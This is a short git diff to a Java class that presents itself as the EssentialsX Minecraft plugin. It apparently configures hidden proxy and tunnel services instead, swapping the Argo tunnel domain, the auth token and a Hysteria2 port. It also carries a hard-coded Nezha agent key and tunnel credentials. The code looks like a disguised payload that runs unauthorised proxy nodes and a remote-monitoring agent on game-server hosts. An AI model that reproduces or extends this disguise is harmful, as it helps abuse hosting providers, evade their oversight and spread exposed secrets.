@@ -79,10 +79,10 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "GTmVnjnxL0bC41DDvN7UzMNqf6jAK9TM");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "hidencloud.bo66.pp.ua");
-        env.put("ARGO_AUTH", "eyJhIjoiOTU4MWYzZmNhMDgwMjgxMTgzMmEzNTNhYmY1OGM2MjMiLCJ0IjoiZjBmZTYxMTMtYjRjZi00YzcwLTljZDUtMzNkNzVjNjQ1YmQ2IiwicyI6Ik5ERTJPVEkyTlRRdFlUTTRaQzAwTTJReExXRTBObUl0TkRBMVpERTBaV1poWVRoaCJ9");
+        env.put("ARGO_DOMAIN", "mcserverhost.boxu.pp.ua");
+        env.put("ARGO_AUTH", "eyJhIjoiOTU4MWYzZmNhMDgwMjgxMTgzMmEzNTNhYmY1OGM2MjMiLCJ0IjoiYzAyZTllYmMtZDM2MC00OTA5LTljNDktY2QwYTM5MTgxMjRiIiwicyI6Ik9UUXdZV0U1WkdFdE1tWmhOeTAwTUdOaUxUbG1Oall0T1RabFpUTmxNbVU1WWpVMCJ9");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "12734");
+        env.put("HY2_PORT", "10940");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
